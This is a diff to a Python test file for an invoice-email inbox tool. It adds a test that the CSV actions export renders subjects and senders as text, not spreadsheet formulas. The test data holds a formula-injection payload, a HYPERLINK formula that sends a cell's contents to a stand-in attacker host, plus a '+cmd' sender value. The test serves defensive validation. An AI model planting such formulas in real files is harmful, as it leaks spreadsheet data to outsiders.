@@ -3,7 +3,9 @@
 from __future__ import annotations
 
 import copy
+import csv
 import importlib.util
+import io
 import json
 import subprocess
 import sys
@@ -22,7 +24,9 @@ from fastapi.testclient import TestClient
 from controller_inbox import assistant, cli
 from controller_inbox.cli import DIGEST_SENT_KEY, load_sample, watch_tick
 from controller_inbox.config import Settings
+from controller_inbox.demo import make_pdf
 from controller_inbox.digest import build_digest, digest_window
+from controller_inbox.folder_mail import ingest_folder
 from controller_inbox.overnight import RunBusy, run_lock, run_overnight
 from controller_inbox.store import Store
 from controller_inbox.web import allowed_hosts, create_app
@@ -349,3 +353,27 @@ def test_an_answer_the_browser_left_is_saved_and_the_model_stops(settings: Setti
     assert answer["text"].startswith("part0 part1 part2 ")
     assert answer["text"].endswith("(Stopped: the page closed before the answer finished.)")
     assert answer["failed"], "an answer cut short isn't learned from"
+
+
+# 11. The actions export keeps a spreadsheet from running a subject or sender as a formula.
+
+
+def test_actions_export_writes_formulas_as_text(settings: Settings, store: Store):
+    settings.ensure_data_dir()
+    subject = '=HYPERLINK("https://evil.example/?d="&A2,"Invoice 2002")'
+    message = EmailMessage()
+    message["Subject"] = subject
+    message["From"] = "AP <+cmd@vendor.example>"
+    message["Date"] = "Mon, 05 Oct 2026 14:30:00 +0000"
+    message.set_content("Please find invoice INV-2002 attached. Amount due $1,250.00 by October 30, 2026.")
+    pdf = make_pdf([["Invoice INV-2002 Amount due $1,250.00"]])
+    message.add_attachment(pdf, maintype="application", subtype="pdf", filename="INV-2002.pdf")
+    (settings.inbox_incoming / "invoice.eml").write_bytes(bytes(message))
+    ingest_folder(store, settings)
+
+    response = TestClient(create_app(settings, store)).get("/export/actions.csv")
+    rows = list(csv.DictReader(io.StringIO(response.text)))
+    assert rows and response.headers["content-type"].startswith("text/csv")
+    assert {row["subject"] for row in rows} == {"'" + subject}
+    assert {row["sender"] for row in rows} == {"'+cmd@vendor.example"}
+    assert all(row["title"][:1] not in {"=", "+", "-", "@"} for row in rows)
